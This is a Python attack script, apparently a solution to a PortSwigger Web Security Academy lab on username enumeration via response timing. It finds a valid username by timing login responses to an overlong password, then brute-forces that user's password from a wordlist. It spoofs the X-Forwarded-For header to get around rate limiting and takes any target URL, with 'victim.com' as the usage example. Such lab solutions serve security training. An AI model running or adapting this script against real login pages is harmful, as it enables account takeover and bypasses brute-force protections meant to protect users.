# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
# The longer he password, the slower the response

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bruteForce(url):

    print("[ + ] Finding username...")

    i = 10000
     
    usernameFile = open('usernames.txt', 'r')
    linesUsername = usernameFile.read().splitlines()
    for line in linesUsername:
    
        # Adding header to bypass brute-force protection
        headers = { "X-Forwarded-For" : str(i) }
        params = { 
        "username": line, 
        "password": "longpasswordddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd", 
    }   
        
        rUsername = requests.post(url, verify=False, proxies=proxies, data=params, headers=headers)

        sys.stdout.write('\r' + "Testing user: " + line + ' -- ' + "Time Response: " + str(rUsername.elapsed.total_seconds()))
        print(" "*50, end='\r', flush=True)
        
        i+=1

        if rUsername.elapsed.total_seconds() > 15:
            print("\n\n------------------------------------")
            print('\r' + "User found: " + line)
            print("------------------------------------")
            print("\n[+] Starting password brute force...")

            username = line

            passwordFile = open('passwords.txt', 'r')
            linesPassword = passwordFile.read().splitlines()
            for line in linesPassword:

                headers = { "X-Forwarded-For" : str(i) }
                params = { 
                        "username": username, 
                        "password": line, 
                    }
                
                rPassword = requests.post(url, verify=False, proxies=proxies, data=params, allow_redirects=False, headers=headers)

                sys.stdout.write('\r' + "Testing password: " + line)
                print(" "*50, end='\r', flush=True)

                i+=1

                if rPassword.status_code == 302:
                    password = line
                    print("\n\n------------------------------------")
                    print("Password found: " + password)
                    print("------------------------------------")
                    print("\nCredentials: %s - %s" % (username, password))
                    break
                
            break

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
